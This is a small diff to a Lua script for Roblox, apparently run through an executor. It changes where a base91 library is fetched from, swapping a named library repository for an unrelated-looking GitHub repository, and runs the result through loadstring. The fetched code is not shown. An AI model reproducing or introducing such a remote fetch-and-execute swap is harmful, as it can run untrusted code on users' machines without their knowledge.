@@ -5,7 +5,7 @@ local logService = game:GetService("LogService")
 local runService = game:GetService("RunService")
 local starterGui = game:GetService("StarterGui")
 -- imports
-local base91 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Dekkonot/base91-luau/main/src/init.lua"))()
+local base91 = loadstring(game:HttpGet("https://raw.githubusercontent.com/reewewifjef/Rmotescan/refs/heads/main/init.lua"))()
 -- variables
 local config
 local executorAPI
